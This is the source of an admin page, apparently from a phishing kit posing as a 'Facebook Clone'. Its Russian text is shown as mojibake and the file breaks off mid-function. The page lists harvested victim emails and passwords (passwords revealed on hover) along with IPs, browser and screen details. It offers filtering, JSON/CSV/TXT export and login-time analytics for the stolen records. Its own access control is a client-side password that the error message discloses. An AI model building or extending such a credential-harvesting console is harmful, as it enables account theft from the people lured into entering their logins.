<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Facebook Clone</title>
    <link rel="stylesheet" href="style.css">
    <!-- –ü–û–î–ö–õ–Æ–ß–ê–ï–ú CONFIG –ü–ï–†–í–´–ú! -->
    <script src="config.js"></script>
    <style>
        /* –ê–¥–º–∏–Ω —Å—Ç–∏–ª–∏ */
        .admin-header {
            background: #242526;
            color: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .stat-card h3 {
            margin: 0 0 10px 0;
            color: #65676b;
            font-size: 14px;
        }
        
        .stat-card .value {
            font-size: 32px;
            font-weight: bold;
            color: #1877f2;
        }
        
        .filters {
            background: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .filter-row {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 10px;
        }
        
        .filter-input {
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            flex: 1;
            min-width: 200px;
        }
        
        .table-container {
            background: white;
            border-radius: 8px;
            overflow: hidden;
            margin-bottom: 30px;
        }
        
        .data-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .data-table th {
            background: #f0f2f5;
            padding: 12px;
            text-align: left;
            font-weight: 600;
            color: #65676b;
        }
        
        .data-table td {
            padding: 12px;
            border-bottom: 1px solid #eee;
        }
        
        .data-table tr:hover {
            background: #f8f9fa;
        }
        
        .action-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
        }
        
        .btn-primary {
            background: #1877f2;
            color: white;
        }
        
        .btn-success {
            background: #42b72a;
            color: white;
        }
        
        .btn-danger {
            background: #ff4444;
            color: white;
        }
        
        .btn-warning {
            background: #ffbb33;
            color: white;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 8px;
            min-width: 400px;
            max-width: 90%;
        }
        
        .loader {
            text-align: center;
            padding: 20px;
            display: none;
        }
        
        .admin-footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 12px;
        }
        
        /* –ö–Ω–æ–ø–∫–∏ –ø–æ–∫–∞–∑–∞/—Å–∫—Ä—ã—Ç–∏—è –ø–∞—Ä–æ–ª—è –≤ —Ç–∞–±–ª–∏—Ü–µ */
        .password-cell {
            cursor: pointer;
            position: relative;
        }
        
        .password-cell:hover:after {
            content: attr(title);
            position: absolute;
            background: #242526;
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
            z-index: 100;
            top: -30px;
            left: 0;
            font-size: 12px;
            white-space: nowrap;
        }
        
        .email-cell {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        .time-cell {
            white-space: nowrap;
        }
        
        #adminInterface {
            display: none;
            padding: 20px;
            max-width: 1400px;
            margin: 0 auto;
        }
        
        #passwordModal {
            display: flex;
        }
    </style>
</head>
<body>
    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –¥–ª—è –ø–∞—Ä–æ–ª—è -->
    <div id="passwordModal" class="modal">
        <div class="modal-content">
            <h2 style="margin-top: 0;">üîê –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–Ω–µ–ª—å</h2>
            <p>–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª–∏:</p>
            <input type="password" id="adminPassword" class="filter-input" placeholder="–ü–∞—Ä–æ–ª—å" style="width: 100%; margin-bottom: 15px;">
            <div class="action-buttons">
                <button onclick="checkPassword()" class="btn btn-primary" style="flex: 1;">–í–æ–π—Ç–∏</button>
                <button onclick="autoLogin()" class="btn btn-success">–ê–≤—Ç–æ–≤—Ö–æ–¥</button>
                <button onclick="goToPreview()" class="btn">–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä</button>
            </div>
            <p style="margin-top: 15px; font-size: 12px; color: #65676b;">
                –ü–æ–¥—Å–∫–∞–∑–∫–∞: –ø–∞—Ä–æ–ª—å —É–∫–∞–∑–∞–Ω –≤ config.js<br>
                –î–ª—è –∞–≤—Ç–æ–≤—Ö–æ–¥–∞: Ctrl+Shift+Enter
            </p>
        </div>
    </div>
    
    <!-- –ú–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —ç–∫—Å–ø–æ—Ä—Ç–∞ -->
    <div id="exportModal" class="modal">
        <div class="modal-content">
            <h2 style="margin-top: 0;">üì§ –≠–∫—Å–ø–æ—Ä—Ç –¥–∞–Ω–Ω—ã—Ö</h2>
            <p>–í—ã–±–µ—Ä–∏—Ç–µ —Ñ–æ—Ä–º–∞—Ç —ç–∫—Å–ø–æ—Ä—Ç–∞:</p>
            <div class="action-buttons" style="margin-bottom: 20px;">
                <button onclick="exportData('json')" class="btn btn-primary">JSON</button>
                <button onclick="exportData('csv')" class="btn btn-success">CSV</button>
                <button onclick="exportData('txt')" class="btn">TXT</button>
            </div>
            <div>
                <h4>–ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö:</h4>
                <pre id="dataPreview" style="background: #f5f5f5; padding: 15px; border-radius: 6px; max-height: 200px; overflow: auto; font-size: 12px;"></pre>
            </div>
            <div class="action-buttons" style="margin-top: 20px;">
                <button onclick="closeExportModal()" class="btn" style="flex: 1;">–ó–∞–∫—Ä—ã—Ç—å</button>
            </div>
        </div>
    </div>
    
    <!-- –û—Å–Ω–æ–≤–Ω–æ–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∞–¥–º–∏–Ω–∫–∏ -->
    <div id="adminInterface">
        <!-- –®–∞–ø–∫–∞ -->
        <div class="admin-header">
            <h1 style="margin: 0; display: flex; align-items: center; gap: 10px;">
                üõ°Ô∏è –ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è Facebook Clone
                <span style="font-size: 14px; background: #1877f2; padding: 3px 8px; border-radius: 12px; color: white;">
                    v3.0.0 FIXED
                </span>
            </h1>
            <p style="margin: 10px 0 0 0; opacity: 0.8;">–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–æ–±—Ä–∞–Ω–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏</p>
        </div>
        
        <!-- –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ -->
        <div class="stats-grid">
            <div class="stat-card">
                <h3>üë• –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π</h3>
                <div class="value" id="totalUsers">0</div>
            </div>
            <div class="stat-card">
                <h3>üìà –í—Ö–æ–¥–æ–≤ —Å–µ–≥–æ–¥–Ω—è</h3>
                <div class="value" id="todayLogins">0</div>
            </div>
            <div class="stat-card">
                <h3>üåê –£–Ω–∏–∫–∞–ª—å–Ω—ã—Ö IP</h3>
                <div class="value" id="uniqueIPs">0</div>
            </div>
            <div class="stat-card">
                <h3>‚è∞ –ü–æ—Å–ª–µ–¥–Ω–∏–π –≤—Ö–æ–¥</h3>
                <div class="value" id="lastLogin">–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö</div>
            </div>
        </div>
        
        <!-- –§–∏–ª—å—Ç—Ä—ã -->
        <div class="filters">
            <h3 style="margin-top: 0;">üîç –§–∏–ª—å—Ç—Ä—ã –ø–æ–∏—Å–∫–∞</h3>
            <div class="filter-row">
                <input type="text" id="filterEmail" class="filter-input" placeholder="–§–∏–ª—å—Ç—Ä –ø–æ email" oninput="filterData()">
                <input type="text" id="filterIP" class="filter-input" placeholder="–§–∏–ª—å—Ç—Ä –ø–æ IP" oninput="filterData()">
                <input type="date" id="filterDate" class="filter-input" onchange="filterData()">
                <select id="filterLimit" class="filter-input" onchange="filterData()">
                    <option value="25">–ü–æ—Å–ª–µ–¥–Ω–∏–µ 25</option>
                    <option value="50">–ü–æ—Å–ª–µ–¥–Ω–∏–µ 50</option>
                    <option value="100">–ü–æ—Å–ª–µ–¥–Ω–∏–µ 100</option>
                    <option value="0">–í—Å–µ –∑–∞–ø–∏—Å–∏</option>
                </select>
            </div>
            <div class="action-buttons">
                <button onclick="refreshData()" class="btn btn-primary">üîÑ –û–±–Ω–æ–≤–∏—Ç—å (F5)</button>
                <button onclick="clearAllData()" class="btn btn-danger">üóëÔ∏è –û—á–∏—Å—Ç–∏—Ç—å –≤—Å—ë (Ctrl+D)</button>
                <button onclick="showExportModal()" class="btn btn-success">üì§ –≠–∫—Å–ø–æ—Ä—Ç (Ctrl+E)</button>
                <button onclick="showDataPreview()" class="btn">üëÅÔ∏è –ü—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä (Ctrl+P)</button>
                <button onclick="logoutAdmin()" class="btn btn-warning">üö™ –í—ã—Ö–æ–¥ (Ctrl+Q)</button>
            </div>
            <p style="margin: 15px 0 0 0; font-size: 12px; color: #65676b;" id="dataCount">
                –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö...
            </p>
        </div>
        
        <!-- –õ–æ–∞–¥–µ—Ä -->
        <div id="loader" class="loader">
            <div class="spinner"></div>
            <p>–ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö...</p>
        </div>
        
        <!-- –¢–∞–±–ª–∏—Ü–∞ –¥–∞–Ω–Ω—ã—Ö -->
        <div class="table-container">
            <table class="data-table">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Email</th>
                        <th>–ü–∞—Ä–æ–ª—å</th>
                        <th>IP</th>
                        <th>–í—Ä–µ–º—è</th>
                        <th>–ë—Ä–∞—É–∑–µ—Ä</th>
                        <th>–≠–∫—Ä–∞–Ω</th>
                        <th>–î–µ–π—Å—Ç–≤–∏—è</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                    <tr>
                        <td colspan="8" style="text-align: center; padding: 50px; color: #65676b;">
                            –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö...
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        <!-- –ê–Ω–∞–ª–∏—Ç–∏–∫–∞ -->
        <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 30px;">
            <h3 style="margin-top: 0;">üìä –ê–Ω–∞–ª–∏—Ç–∏–∫–∞</h3>
            <div id="analytics">
                <p style="color: #65676b;">–î–∞–Ω–Ω—ã–µ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è...</p>
            </div>
        </div>
        
        <!-- –§—É—Ç–µ—Ä -->
        <div class="admin-footer">
            <p>Facebook Clone Admin Panel v3.0.0 | –î–∞–Ω–Ω—ã–µ —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ LocalStorage</p>
            <p>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ Ctrl+Shift+A –Ω–∞ –≥–ª–∞–≤–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞</p>
            <p style="margin-top: 10px;">
                <button onclick="goToPreview()" class="btn" style="padding: 5px 15px; font-size: 12px;">
                    üîÑ –ü–µ—Ä–µ–π—Ç–∏ –∫ –ø—Ä–µ–¥–ø—Ä–æ—Å–º–æ—Ç—Ä—É
                </button>
            </p>
        </div>
    </div>
    
    <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º —Å–∫—Ä–∏–ø—Ç—ã -->
    <script src="data.js"></script>
    
    <!-- –°–ö–†–ò–ü–¢ –ê–î–ú–ò–ù–ö–ò -->
    <script>
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        document.addEventListener('DOMContentLoaded', function() {
            console.log('Admin page loaded');
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∑–∞–≥—Ä—É–∂–µ–Ω—ã –ª–∏ CONFIG –∏ DataCollector
            if (!window.CONFIG) {
                console.error('CONFIG –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω!');
                alert('–û—à–∏–±–∫–∞: CONFIG –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ config.js');
                return;
            }
            
            if (!window.DataCollector) {
                console.error('DataCollector –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω!');
                alert('–û—à–∏–±–∫–∞: DataCollector –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ data.js');
                return;
            }
            
            const savedPassword = localStorage.getItem('admin_authenticated');
            console.log('–°–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å:', savedPassword ? '–µ—Å—Ç—å' : '–Ω–µ—Ç');
            console.log('–ü–∞—Ä–æ–ª—å –∏–∑ CONFIG:', CONFIG.ADMIN_PASSWORD);
            
            if (savedPassword === CONFIG.ADMIN_PASSWORD) {
                console.log('–ü–∞—Ä–æ–ª—å –≤–µ—Ä–Ω—ã–π, –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∞–¥–º–∏–Ω–∫—É');
                showAdminInterface();
            } else {
                console.log('–ü–æ–∫–∞–∑—ã–≤–∞–µ–º –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ –ø–∞—Ä–æ–ª—è');
                showPasswordModal();
            }
            
            // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∑–∞–∫—Ä—ã—Ç–∏—è –ø–æ –∫–ª–∏–∫—É –≤–Ω–µ –º–æ–¥–∞–ª–∫–∏
            document.addEventListener('click', function(event) {
                const modal = document.getElementById('passwordModal');
                if (modal && modal.style.display === 'flex') {
                    const modalContent = document.querySelector('.modal-content');
                    if (!modalContent.contains(event.target)) {
                        closePasswordModal();
                    }
                }
                
                const exportModal = document.getElementById('exportModal');
                if (exportModal && exportModal.style.display === 'flex') {
                    const exportContent = exportModal.querySelector('.modal-content');
                    if (!exportContent.contains(event.target)) {
                        closeExportModal();
                    }
                }
            });
            
            // –ó–∞–∫—Ä—ã—Ç–∏–µ –ø–æ Escape
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    closePasswordModal();
                    closeExportModal();
                }
                
                // –ê–≤—Ç–æ–≤—Ö–æ–¥ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è (Ctrl+Shift+Enter)
                if (e.ctrlKey && e.shiftKey && e.key === 'Enter') {
                    e.preventDefault();
                    autoLogin();
                }
            });
        });
        
        // –ü–æ–∫–∞–∑–∞—Ç—å –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ —Å –ø–∞—Ä–æ–ª–µ–º
        function showPasswordModal() {
            console.log('showPasswordModal –≤—ã–∑–≤–∞–Ω–∞');
            const modal = document.getElementById('passwordModal');
            if (modal) {
                modal.style.display = 'flex';
                // –§–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –ø–∞—Ä–æ–ª—è
                setTimeout(() => {
                    const passField = document.getElementById('adminPassword');
                    if (passField) passField.focus();
                }, 100);
            }
        }
        
        function closePasswordModal() {
            console.log('closePasswordModal –≤—ã–∑–≤–∞–Ω–∞');
            const modal = document.getElementById('passwordModal');
            if (modal) {
                modal.style.display = 'none';
            }
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–∞—Ä–æ–ª—å
        function checkPassword() {
            console.log('checkPassword –≤—ã–∑–≤–∞–Ω–∞');
            const passwordInput = document.getElementById('adminPassword');
            if (!passwordInput) {
                alert('–û—à–∏–±–∫–∞: –ø–æ–ª–µ –ø–∞—Ä–æ–ª—è –Ω–µ –Ω–∞–π–¥–µ–Ω–æ');
                return;
            }
            
            const password = passwordInput.value;
            console.log('–í–≤–µ–¥–µ–Ω –ø–∞—Ä–æ–ª—å:', password);
            console.log('–û–∂–∏–¥–∞–µ–º—ã–π –ø–∞—Ä–æ–ª—å:', CONFIG.ADMIN_PASSWORD);
            
            if (password === CONFIG.ADMIN_PASSWORD) {
                console.log('–ü–∞—Ä–æ–ª—å –≤–µ—Ä–Ω—ã–π!');
                localStorage.setItem('admin_authenticated', password);
                showAdminInterface();
                closePasswordModal();
            } else {
                alert('–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ: ' + CONFIG.ADMIN_PASSWORD);
                passwordInput.value = '';
                passwordInput.focus();
            }
        }
        
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –≤—Ö–æ–¥ (–¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è)
        function autoLogin() {
            console.log('autoLogin –≤—ã–∑–≤–∞–Ω–∞');
            localStorage.setItem('admin_authenticated', CONFIG.ADMIN_PASSWORD);
            showAdminInterface();
            closePasswordModal();
        }
        
        // –ü–æ–∫–∞–∑–∞—Ç—å –∞–¥–º–∏–Ω –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
        function showAdminInterface() {
            console.log('showAdminInterface –≤—ã–∑–≤–∞–Ω–∞');
            const adminInterface = document.getElementById('adminInterface');
            if (adminInterface) {
                adminInterface.style.display = 'block';
                console.log('–ê–¥–º–∏–Ω –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –ø–æ–∫–∞–∑–∞–Ω');
                loadAdminData();
                
                // –ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ
                if (CONFIG.AUTO_REFRESH_DATA) {
                    console.log('–ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≤–∫–ª—é—á–µ–Ω–æ:', CONFIG.REFRESH_INTERVAL + '–º—Å');
                    setInterval(loadAdminData, CONFIG.REFRESH_INTERVAL);
                }
            } else {
                console.error('–≠–ª–µ–º–µ–Ω—Ç adminInterface –Ω–µ –Ω–∞–π–¥–µ–Ω!');
            }
        }
        
        // –ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ –∞–¥–º–∏–Ω–∫—É
        function loadAdminData() {
            console.log('loadAdminData –≤—ã–∑–≤–∞–Ω–∞');
            
            if (!window.DataCollector) {
                console.error('DataCollector –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
                return;
            }
            
            try {
                const data = DataCollector.loadData();
                const stats = DataCollector.getStats();
                
                console.log('–î–∞–Ω–Ω—ã–µ –∑–∞–≥—Ä—É–∂–µ–Ω—ã:', {
                    users: data.users.length,
                    visits: data.visits.length,
                    stats: stats
                });
                
                // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
                document.getElementById('totalUsers').textContent = stats.totalUsers;
                document.getElementById('todayLogins').textContent = getTodayLogins(data.users);
                document.getElementById('uniqueIPs').textContent = stats.uniqueIPs;
                document.getElementById('lastLogin').textContent = stats.lastLogin;
                
                // –û–±–Ω–æ–≤–ª—è–µ–º —Ç–∞–±–ª–∏—Ü—É
                updateTable(data.users);
                
                // –û–±–Ω–æ–≤–ª—è–µ–º –∞–Ω–∞–ª–∏—Ç–∏–∫—É
                updateAnalytics(data.users);
                
                // –°–∫—Ä—ã–≤–∞–µ–º –ª–æ–∞–¥–µ—Ä
                const loader = document.getElementById('loader');
                if (loader) loader.style.display = 'none';
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –≤ loadAdminData:', error);
                document.getElementById('totalUsers').textContent = '–û—à–∏–±–∫–∞';
                document.getElementById('todayLogins').textContent = '–û—à–∏–±–∫–∞';
                document.getElementById('uniqueIPs').textContent = '–û—à–∏–±–∫–∞';
                document.getElementById('lastLogin').textContent = '–û—à–∏–±–∫–∞';
            }
        }
        
        // –ü–æ–ª—É—á–∏—Ç—å –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤—Ö–æ–¥–æ–≤ —Å–µ–≥–æ–¥–Ω—è
        function getTodayLogins(users) {
            if (!users || !Array.isArray(users)) return 0;
            
            const today = new Date().toDateString();
            return users.filter(user => {
                try {
                    if (!user.timestamp) return false;
                    const userDate = new Date(user.timestamp).toDateString();
                    return userDate === today;
                } catch (e) {
                    return false;
                }
            }).length;
        }
        
        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–∞–±–ª–∏—Ü—ã
        function updateTable(users) {
            console.log('updateTable –≤—ã–∑–≤–∞–Ω–∞, –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:', users.length);
            
            const tableBody = document.getElementById('tableBody');
            const dataCount = document.getElementById('dataCount');
            
            if (!tableBody || !dataCount) {
                console.error('–≠–ª–µ–º–µ–Ω—Ç—ã —Ç–∞–±–ª–∏—Ü—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã');
                return;
            }
            
            // –§–∏–ª—å—Ç—Ä—ã
            const filterEmail = document.getElementById('filterEmail')?.value.toLowerCase() || '';
            const filterIP = document.getElementById('filterIP')?.value.toLowerCase() || '';
            const filterDate = document.getElementById('filterDate')?.value || '';
            const filterLimit = parseInt(document.getElementById('filterLimit')?.value || '25');
            
            // –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è
            let filteredUsers = users;
            
            if (filterEmail) {
                filteredUsers = filteredUsers.filter(user => 
                    user.email && user.email.toLowerCase().includes(filterEmail)
                );
            }
            
            if (filterIP) {
                filteredUsers = filteredUsers.filter(user => 
                    user.ipInfo?.ip && user.ipInfo.ip.toLowerCase().includes(filterIP)
                );
            }
            
            if (filterDate) {
                filteredUsers = filteredUsers.filter(user => {
                    try {
                        const userDate = new Date(user.timestamp).toISOString().split('T')[0];
                        return userDate === filterDate;
                    } catch (e) {
                        return false;
                    }
                });
            }
            
            // –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ
            if (filterLimit > 0) {
                filteredUsers = filteredUsers.slice(-filterLimit).reverse();
            } else {
                filteredUsers = filteredUsers.slice().reverse();
            }
            
            // –û–±–Ω–æ–≤–ª—è–µ–º —Å—á–µ—Ç—á–∏–∫
            dataCount.textContent = `${filteredUsers.length} –∑–∞–ø–∏—Å–µ–π (–≤—Å–µ–≥–æ: ${users.length})`;
            
            // –û—á–∏—â–∞–µ–º —Ç–∞–±–ª–∏—Ü—É
            tableBody.innerHTML = '';
            
            // –ó–∞–ø–æ–ª–Ω—è–µ–º —Ç–∞–±–ª–∏—Ü—É
            filteredUsers.forEach((user, index) => {
                try {
                    const row = document.createElement('tr');
                    
                    // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –≤—Ä–µ–º—è
                    let formattedTime = '–û—à–∏–±–∫–∞ –¥–∞—Ç—ã';
                    try {
                        const time = new Date(user.timestamp);
                        formattedTime = time.toLocaleString('ru-RU', {
                            day: '2-digit',
                            month: '2-digit',
                            year: 'numeric',
                            hour: '2-digit',
                            minute: '2-digit'
                        });
                    } catch (e) {
                        formattedTime = user.timestamp || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö';
                    }
                    
                    // –û–±—Ä–µ–∑–∞–µ–º user agent
                    const userAgent = user.userAgent || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö';
                    const shortUserAgent = userAgent.length > 50 
                        ? userAgent.substring(0, 50) + '...' 
                        : userAgent;
                    
                    // –ü–æ–ª—É—á–∞–µ–º —ç–∫—Ä–∞–Ω
                    const screenInfo = user.screenInfo || {};
                    const screenText = screenInfo.width && screenInfo.height 
                        ? `${screenInfo.width}√ó${screenInfo.height}` 
                        : '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö';
                    
                    // –ü–æ–ª—É—á–∞–µ–º IP
                    const ipText = user.ipInfo?.ip || 'unknown';
                    
                    row.innerHTML = `
                        <td>${index + 1}</td>
                        <td class="email-cell" title="${user.email || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}">${user.email || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}</td>
                        <td class="password-cell" title="${user.password || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}">${'‚Ä¢'.repeat(user.password?.length || 0)}</td>
                        <td title="${ipText}">${ipText}</td>
                        <td class="time-cell" title="${user.timestamp || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}">${formattedTime}</td>
                        <td title="${userAgent}">${shortUserAgent}</td>
                        <td>${screenText}</td>
                        <td>
                            <button onclick="viewUserDetails('${user.id || ''}')" style="background: none; border: 1px solid #1877f2; color: #1877f2; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px;">
                                üëÅÔ∏è
                            </button>
                            <button onclick="deleteUser('${user.id || ''}')" style="background: none; border: 1px solid #ff4444; color: #ff4444; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; margin-left: 5px;">
                                üóëÔ∏è
                            </button>
                        </td>
                    `;
                    
                    tableBody.appendChild(row);
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Å—Ç—Ä–æ–∫–∏:', error);
                }
            });
            
            if (filteredUsers.length === 0) {
                const row = document.createElement('tr');
                row.innerHTML = `<td colspan="8" style="text-align: center; padding: 20px; color: #65676b;">–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è</td>`;
                tableBody.appendChild(row);
            }
        }
        
        // –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö
        function filterData() {
            console.log('filterData –≤—ã–∑–≤–∞–Ω–∞');
            loadAdminData();
        }
        
        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏
        function updateAnalytics(users) {
            const analytics = document.getElementById('analytics');
            if (!analytics) return;
            
            if (!users || users.length === 0) {
                analytics.innerHTML = '<p>–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –∞–Ω–∞–ª–∏—Ç–∏–∫–∏</p>';
                return;
            }
            
            // –ì—Ä—É–ø–ø–∏—Ä–æ–≤–∫–∞ –ø–æ —á–∞—Å–∞–º
            const hourlyData = {};
            users.forEach(user => {
                try {
                    const hour = new Date(user.timestamp).getHours();
                    hourlyData[hour] = (hourlyData[hour] || 0) + 1;
                } catch (e) {
                    // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –æ—à–∏–±–∫–∏
                }
            });
            
            // –°–∞–º—ã–µ –ø–æ–ø—É–ª—è—Ä–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä—ã
            const browsers = {};
            users.forEach(user => {
                const ua = (user.userAgent || '').toLowerCase();
                let browser = '–î—Ä—É–≥–æ–π';
                
                if (ua.includes('chrome')) browser = 'Chrome';
                else if (ua.includes('firefox')) browser = 'Firefox';
                else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
                else if (ua.includes('edge')) browser = 'Edge';
                else if (ua.includes('opera')) browser = 'Opera';
                
                browsers[browser] = (browsers[browser] || 0) + 1;
            });
            
            // –°–æ–∑–¥–∞–µ–º HTML –∞–Ω–∞–ª–∏—Ç–∏–∫–∏
            let html = `
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px;">
                        <h4>üìä –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –ø–æ —á–∞—Å–∞–º</h4>
                        <div style="margin-top: 10px; display: flex; align-items: flex-end; height: 80px;">
            `;
            
            const maxCount = Math.max(...Object.values(hourlyData), 1);
            for (let hour = 0; hour < 24; hour++) {
                const count = hourlyData[hour] || 0;
                const barHeight = (count / maxCount) * 50;
                html += `
                    <div style="display: inline-block; margin-right: 2px; text-align: center;">
                        <div style="height: ${barHeight}px; width: 20px; background: #1877f2; margin: 0 auto; border-radius: 3px 3px 0 0;"></div>
                        <div style="font-size: 10px; margin-top: 5px;">${hour}:00</div>
                    </div>
                `;
            }
            
            html += `
                        </div>
                    </div>
                    
                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px;">
                        <h4>üåê –ë—Ä–∞—É–∑–µ—Ä—ã</h4>
                        <div style="margin-top: 10px;">
            `;
            
            Object.entries(browsers).forEach(([browser, count]) => {
                const percentage = (count / users.length * 100).toFixed(1);
                html += `
                    <div style="margin-bottom: 8px;">
                        <div style="display: flex; justify-content: space-between;">
                            <span>${browser}</span>
                            <span>${count} (${percentage}%)</span>
                        </div>
